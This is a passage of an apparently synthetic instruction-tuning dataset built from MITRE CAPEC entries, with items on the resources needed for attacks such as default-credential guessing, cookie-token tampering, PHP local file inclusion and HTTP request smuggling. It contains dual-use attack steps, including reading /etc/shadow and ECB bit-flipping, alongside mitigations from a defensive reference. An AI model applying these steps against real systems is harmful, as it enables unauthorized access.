          "Prerequisite": "The system uses one factor password based authentication.The adversary has the means to interact with the system."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "An adversary just needs to gain access to common default usernames/passwords specific to the technologies used by the system. Additionally, a brute force attack leveraging common passwords can be easily realized if the user name is known."
          }
        },
        "Resources_Required": {
          "Resource": "Technology or vendor specific list of default usernames and passwords."
        },
        "Indicators": {
          "Indicator": "Many incorrect login attempts are detected by the system."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Delete all default account credentials that may be put in by the product vendor.",
            "Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.",
            "Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.",
            "Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen."
          ]
        },
        "Example_Instances": {
          "Example": [
            "A user sets their password to \"123\" or intentionally leaves their password blank. If the system does not have password strength enforcement against a sound password policy, this password may be admitted. Passwords like these two examples are two simple and common passwords that are easily able to be guessed by the adversary.",
            "Cisco 2700 Series Wireless Location Appliances (version 2.1.34.0 and earlier) have a default administrator username \"root\" with a password \"password\". This allows remote attackers to easily obtain administrative privileges. See also: CVE-2006-5288",
            "In April 2019, adversaries attacked several popular IoT devices (a VOIP phone, an office printer, and a video decoder) across multiple customer locations. An investigation conducted by the Microsoft Security Resposne Center (MSRC) discovered that these devices were used to gain initial access to corporate networks. In two of the cases, the passwords for the devices were deployed without changing the default manufacturer\u2019s passwords and in the third instance the latest security update had not been applied to the device. [REF-572]"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "521"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "798"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1078.001",
            "Entry_Name": "Valid Accounts:Default Accounts"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-572"
            },
            {
              "@External_Reference_ID": "REF-574"
            },
            {
              "@External_Reference_ID": "REF-596",
              "@Section": "Testing for Account Enumeration and Guessable User Account"
            },
            {
              "@External_Reference_ID": "REF-597",
              "@Section": "Testing for Default Credentials"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, References, Related_Attack_Patterns, Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-08-04",
            "#text": "Try Common(default) Usernames and Passwords"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Manipulating Opaque Client-based Data Tokens (CAPEC ID: 39)",
    "context": "",
    "output": "required resources:\nThe Attacker needs no special hardware-based resources in order to conduct this attack. Software plugins, such as Tamper Data for Firefox, may help in manipulating URL- or cookie-based data.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The Attacker needs no special hardware-based resources in order to conduct this attack. Software plugins, such as Tamper Data for Firefox, may help in manipulating URL- or cookie-based data.",
      "@Name": "Manipulating Opaque Client-based Data Tokens (CAPEC ID: 39)",
      "attack_ptrn": {
        "@ID": "39",
        "@Name": "Manipulating Opaque Client-based Data Tokens",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "In circumstances where an application holds important data client-side in tokens (cookies, URLs, data files, and so forth) that data can be manipulated. If client or server-side application components reinterpret that data as authentication tokens or data (such as store item pricing or wallet information) then even opaquely manipulating that data may bear fruit for an Attacker. In this pattern an attacker undermines the assumption that client side tokens have been adequately protected from tampering through use of encryption or obfuscation.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "22",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Enumerate information passed to client side] The attacker identifies the parameters used as part of tokens to take business or security decisions",
              "Technique": [
                "Use WebScarab to reveal hidden fields while browsing.",
                "Use a sniffer to capture packets",
                "View source of web page to find hidden fields",
                "Examine URL to see if any opaque tokens are in it",
                "Disassemble or decompile client-side application",
                "Use debugging tools such as File Monitor, Registry Monitor, Debuggers, etc."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Determine protection mechanism for opaque token] The attacker determines the protection mechanism used to protect the confidentiality and integrity of these data tokens. They may be obfuscated or a full blown encryption may be used.",
              "Technique": [
                "Look for signs of well-known character encodings",
                "Look for cryptographic signatures",
                "Look for delimiters or other indicators of structure"
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Modify parameter/token values] Trying each parameter in turn, the attacker modifies the values",
              "Technique": [
                "Modify tokens logically",
                "Modify tokens arithmetically",
                "Modify tokens bitwise",
                "Modify structural components of tokens",
                "Modify order of parameters/tokens"
              ]
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Cycle through values for each parameter.] Depending on the nature of the application, the attacker now cycles through values of each parameter and observes the effects of this modification in the data returned by the server",
              "Technique": [
                "Use network-level packet injection tools such as netcat",
                "Use application-level data modification tools such as Tamper Data, WebScarab, TamperIE, etc.",
                "Use modified client (modified by reverse engineering)",
                "Use debugging tools to modify data in client"
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An attacker already has some access to the system or can steal the client based data tokens from another user who has access to the system.",
            "For an Attacker to viably execute this attack, some data (later interpreted by the application) must be held client-side in a way that can be manipulated without detection. This means that the data or tokens are not CRCd as part of their value or through a separate meta-data store elsewhere."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "If the client site token is obfuscated."
            },
            {
              "@Level": "High",
              "#text": "If the client site token is encrypted."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "The Attacker needs no special hardware-based resources in order to conduct this attack. Software plugins, such as Tamper Data for Firefox, may help in manipulating URL- or cookie-based data."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "One solution to this problem is to protect encrypted data with a CRC of some sort. If knowing who last manipulated the data is important, then using a cryptographic \"message authentication code\" (or hMAC) is prescribed. However, this guidance is not a panacea. In particular, any value created by (and therefore encrypted by) the client, which itself is a \"malicious\" value, all the protective cryptography in the world can't make the value 'correct' again. Put simply, if the client has control over the whole process of generating and encoding the value, then simply protecting its integrity doesn't help.",
            "Make sure to protect client side authentication tokens for confidentiality (encryption) and integrity (signed hash)",
            "Make sure that all session tokens use a good source of randomness",
            "Perform validation on the server side to make sure that client side data tokens are consistent with what is expected."
          ]
        },
        "Example_Instances": {
          "Example": [
            "With certain price watching websites, that aggregate products available prices, the user can buy items through whichever vendors has product availability, the best price, or other differentiator. Once a user selects an item, the site must broker the purchase of that item with the vendor. Because vendors sell the same product through different channel partners at different prices, token exchange between price watching sites and selling vendors will often contain pricing information. With some price watching sites, manipulating URL-data (which is encrypted) even opaquely yields different prices charged by the fulfilling vendor. If the manipulated price turns out higher, the Attacker can cancel purchase. If the Attacker succeeded in manipulating the token and creating a lower price, they proceed.",
            "Upon successful authentication user is granted an encrypted authentication cookie by the server and it is stored on the client. One piece of information stored in the authentication cookie reflects the access level of the user (e.g. \"u\" for user). The authentication cookie is encrypted using the Electronic Code Book (ECB) mode, that naively encrypts each of the plaintext blocks to each of the ciphertext blocks separately. An attacker knows the structure of the cookie and can figure out what bits (encrypted) store the information relating to the access level of the user. An attacker modifies the authentication cookie and effectively substitutes \"u\" for \"a\" by flipping some of the corresponding bits of ciphertext (trial and error). Once the correct \"flip\" is found, when the system is accessed, the attacker is granted administrative privileges in the system. Note that in this case an attacker did not have to figure out the exact encryption algorithm or find the secret key, but merely exploit the weakness inherent in using the ECB encryption mode.",
            "Archangel Weblog 0.90.02 allows remote attackers to bypass authentication by setting the ba_admin cookie to 1. See also: CVE-2006-0944"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "353"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "302"
            },
            {
              "@CWE_ID": "472"
            },
            {
              "@CWE_ID": "565"
            },
            {
              "@CWE_ID": "315"
            },
            {
              "@CWE_ID": "539"
            },
            {
              "@CWE_ID": "384"
            },
            {
              "@CWE_ID": "233"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: TCP Congestion Control Flag (ECN) Probe (CAPEC ID: 325)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern TCP Congestion Control Flag (ECN) Probe (CAPEC ID: 325):\nA tool capable of sending and receiving packets from a remote system.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool capable of sending and receiving packets from a remote system.",
      "@Name": "TCP Congestion Control Flag (ECN) Probe (CAPEC ID: 325)",
      "attack_ptrn": {
        "@ID": "325",
        "@Name": "TCP Congestion Control Flag (ECN) Probe",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "This OS fingerprinting probe checks to see if the remote host supports explicit congestion notification (ECN) messaging. ECN messaging was designed to allow routers to notify a remote host when signal congestion problems are occurring. Explicit Congestion Notification messaging is defined by RFC 3168. Different operating systems and versions may or may not implement ECN notifications, or may respond uniquely to particular ECN flag types.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "312"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "A tool capable of sending and receiving packets from a remote system."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-212",
              "@Section": "Chapter 8. Remote OS Detection"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Authentication Abuse (CAPEC ID: 114), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nA client application, command-line access to a binary, or scripting language capable of interacting with the authentication mechanism.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A client application, command-line access to a binary, or scripting language capable of interacting with the authentication mechanism.",
      "@Name": "Authentication Abuse (CAPEC ID: 114)",
      "attack_ptrn": {
        "@ID": "114",
        "@Name": "Authentication Abuse",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker.",
        "Extended_Description": {
          "xhtml:p": "This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the \"Exploitation of Session Variables, Resource IDs and other Trusted Credentials\" attack patterns."
        },
        "Typical_Severity": "Medium",
        "Prerequisites": {
          "Prerequisite": "An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc. which is flawed in some way."
        },
        "Resources_Required": {
          "Resource": "A client application, command-line access to a binary, or scripting language capable of interacting with the authentication mechanism."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "287"
            },
            {
              "@CWE_ID": "1244"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1548",
            "Entry_Name": "Abuse Elevation Control Mechanism"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: PHP Local File Inclusion (CAPEC ID: 252)",
    "context": "",
    "output": "The resources required to execute PHP Local File Inclusion (CAPEC ID: 252) are the following: The attacker needs to have enough access to the target application to control the identity of a locally included PHP file.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker needs to have enough access to the target application to control the identity of a locally included PHP file.",
      "@Name": "PHP Local File Inclusion (CAPEC ID: 252)",
      "attack_ptrn": {
        "@ID": "252",
        "@Name": "PHP Local File Inclusion",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "The attacker loads and executes an arbitrary local PHP file on a target machine. The attacker could use this to try to load old versions of PHP files that have known vulnerabilities, to load PHP files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "251"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey application] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find. The adversary is looking for URLs that show PHP file inclusion is used, which can look something like \"http://vulnerable-website/file.php?file=index.php\".",
              "Technique": [
                "Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt variations on input parameters] Once the adversary finds a vulnerable URL that takes file input, they attempt a variety of path traversal techniques to attempt to get the application to display the contents of a local file, or execute a different PHP file already stored locally on the server.",
              "Technique": [
                "Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of path traversal techniques used to include well known files.",
                "Use a proxy tool to record results of manual input of local file inclusion probes in known URLs."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Include desired local file] Once the adversary has determined which techniques of path traversal successfully work with the vulnerable PHP application, they will target a specific local file to include. These can be files such as \"/etc/passwd\", \"/etc/shadow\", or configuration files for the application that might expose sensitive information."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted PHP application must have a bug that allows an attacker to control which code file is loaded at some juncture."
        },
        "Resources_Required": {
          "Resource": "The attacker needs to have enough access to the target application to control the identity of a locally included PHP file."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "829"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-621",
            "@Section": "PHP File Inclusion"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: HTTP Request Smuggling (CAPEC ID: 33)",
    "context": "",
    "output": "required resources:\nTools capable of crafting malicious HTTP messages and monitoring HTTP message responses.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Tools capable of crafting malicious HTTP messages and monitoring HTTP message responses.",
      "@Name": "HTTP Request Smuggling (CAPEC ID: 33)",
      "attack_ptrn": {
        "@ID": "33",
        "@Name": "HTTP Request Smuggling",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": [
            "An adversary abuses the flexibility and discrepancies in the parsing and interpretation of HTTP Request messages using various HTTP headers, request-line and body parameters as well as message sizes (denoted by the end of message signaled by a given HTTP header) by different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) to secretly send unauthorized and malicious HTTP requests to a back-end HTTP agent (e.g., web server).",
            "See CanPrecede relationships for possible consequences."
          ]
        },
        "Extended_Description": {
          "xhtml:p": [
            "A maliciously crafted HTTP request, which contains a second secretly embedded HTTP request is interpreted by an intermediary web proxy as single benign HTTP request, is forwarded to a back-end server, that interprets and parses the HTTP request as two authorized benign HTTP requests bypassing security controls.",
            "This attack usually involves the misuse of the HTTP headers: Content-Length and Transfer-Encoding. These abuses are discussed in RFC 2616 #4.4.3 and section #4.2 and are related to ordering and precedence of these headers. [REF-38]",
            "Additionally this attack can be performed through modification and/or fuzzing of parameters composing the request-line of HTTP messages.",
            "This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions in the HTTP agents.",
            {
              "xhtml:i": "back-end HTTP agent",
              "#text": "This differs from CAPEC-273 HTTP Response Smuggling, which is usually an attempt to compromise a client agent (e.g., web browser) by sending malicious content in HTTP responses from back-end HTTP infrastructure. HTTP Request Smuggling is an attempt to compromise avia HTTP Request messages."
            },
            "HTTP Splitting (CAPEC-105 and CAPEC-34) is different from HTTP Smuggling due to the fact that during implementation of asynchronous requests, HTTP Splitting requires the embedding/injection of arbitrary HTML headers and content through user input into browser cookies or Ajax web/browser object parameters like XMLHttpRequest."
          ]
        },
        "Alternate_Terms": {
          "Alternate_Term": {
            "Term": "HTTP Desync",
            "Description": "Modification/manipulation of HTTP message headers, request-line and body parameters to disrupt and interfere in the interpretation and parsing of HTTP message lengths/boundaries for consecutive HTTP messages by HTTP agents in a HTTP chain or network path."
          }
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "220"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "273"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "115"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "141"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "63"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "593"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "148"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "154"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.",
              "Technique": "Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer."
            },
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, message sizes, and HTTP headers."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP requests to interfere with the parsing of intermediary and back-end HTTP infrastructure, followed by normal/benign HTTP request from the adversary or a random user. The intended consequences of the malicious HTTP requests will be observed in the HTTP infrastructure response to the normal/benign HTTP request to confirm applicability of identified vulnerabilities in the adversary's plan of attack.",
              "Technique": [
                "Continue the monitoring of HTTP traffic.",
                {
                  "xhtml:p": [
                    "Utilize various combinations of HTTP Headers within a single HTTP Request such as: Content-Length & Transfer-Encoding (CL;TE), Transfer-Encoding & Content-Length (TE;CL), or double Transfer-Encoding (TE;TE), so that additional embedded requests or data in the body of the original request are unprocessed and treated as part of subsequent requests by the intended target HTTP agent.",
                    "From these HTTP Header combinations the adversary observes any timing delays (usually in the form of HTTP 404 Error response) or any other unintended consequences."
                  ],
                  "xhtml:ul": {
                    "xhtml:li": [
                      "For CL;TE and TE;CL HTTP header combinations, the first HTTP agent, in the HTTP message path that receives the HTTP request, takes precedence or only processes one header but not the other, while the second/final HTTP agent processes the opposite header, allowing for embedded HTTP requests to be ignored and smuggled to the intended target HTTP agent.",
                      "For TE;TE HTTP headers combination, all HTTP agents in HTTP message path process Transfer-Encoding header, however, adversary obfuscation (see Mitigations for details) of one of the Transfer-Encoding headers, by not adhering strictly to the protocol specification, can cause it to be unprocessed/ignored by a designated HTTP agent, hence allowing embedded HTTP requests to be smuggled. ."
                    ]
                  }
                },
                {
                  "xhtml:p": [
                    "Construct a very large HTTP request using multiple Content-Length headers of various data lengths that can potentially cause subsequent requests to be ignored by an intermediary HTTP agent (firewall) and/or eventually parsed separately by the target HTTP agent (web server).",
                    "Note that most modern HTTP infrastructure reject HTTP requests with multiple Content-Length headers."
                  ]
                },
                "Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request."
              ]
            },
            {
              "Step": "1",
              "Phase": "Exploit",
              "Description": "[Perform HTTP Request Smuggling attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.",
              "Technique": "Leverage techniques identified in the Experiment Phase."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An additional intermediary HTTP agent such as an application firewall or a web caching proxy between the adversary and the second agent such as a web server, that sends multiple HTTP messages over same network connection.",
            "Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.",
            "HTTP agents running on HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers."
            },
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers."
            },
            {
              "@Level": "Medium",
              "#text": "Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Tools capable of crafting malicious HTTP messages and monitoring HTTP message responses."
        },
        "Indicators": {
          "Indicator": "Differences in requests processed by the two agents. This requires careful monitoring or a capable log analysis tool."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.",
            "Configuration: front-end HTTP agents notice ambiguous requests.",
            "Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.",
            "Configuration: Disable reuse of back-end connections.",
            "Configuration: Use HTTP/2 for back-end connections.",
            "Configuration: Use the same web server software for front-end and back-end server.",
            "Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.",
            "Configuration: Prioritize Transfer-Encoding header over Content-Length, whenever an HTTP message contains both.",
            "Configuration: Disallow HTTP messages with both Transfer-Encoding and Content-Length or Double Content-Length Headers.",
            {
              "xhtml:ul": {
                "xhtml:li": [
                  "Headers with no space before the value \u201cchunked\u201d",
                  "Headers with extra spaces",
                  "Headers beginning with trailing characters",
                  "Headers providing a value \u201cchunk\u201d instead of \u201cchunked\u201d (the server normalizes this as chunked encoding)",
                  "Headers with multiple spaces before the value \u201cchunked\u201d",
                  "Headers with quoted values (whether single or double quotations)",
                  "Headers with CRLF characters before the value \u201cchunked\u201d",
                  "Values with invalid characters"
                ]
              },
              "#text": "Configuration: Disallow Malformed/Invalid Transfer-Encoding Headers used in obfuscation, such as:"
            },
            "Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)",
            "Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.",
            "Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": "When using Haproxy 1.5.3 version as front-end proxy server with with Node.js version 14.13.1 or 12.19.0 as the back-end web server it is possible to use two same header fields for example: two Transfer-Encoding, Transfer-Encoding: chunked and Transfer-Encoding: chunked-false, to bypass Haproxy /flag URI restriction and receive the Haproxy flag value, since Node.js identifies the first header but ignores the second header. See also: CVE-2020-8287"
            },
            {
              "xhtml:p": "When using Sun Java System Web Proxy Server 3.x or 4.x in conjunction with Sun ONE/iPlanet 6.x, Sun Java System Application Server 7.x or 8.x, it is possible to bypass certain application firewall protections, hijack web sessions, perform Cross Site Scripting or poison the web proxy cache using HTTP Request Smuggling. Differences in the way HTTP requests are parsed by the Proxy Server and the Application Server enable malicious requests to be smuggled through to the Application Server, thereby exposing the Application Server to aforementioned attacks. See also: CVE-2006-6276"
            },
            {
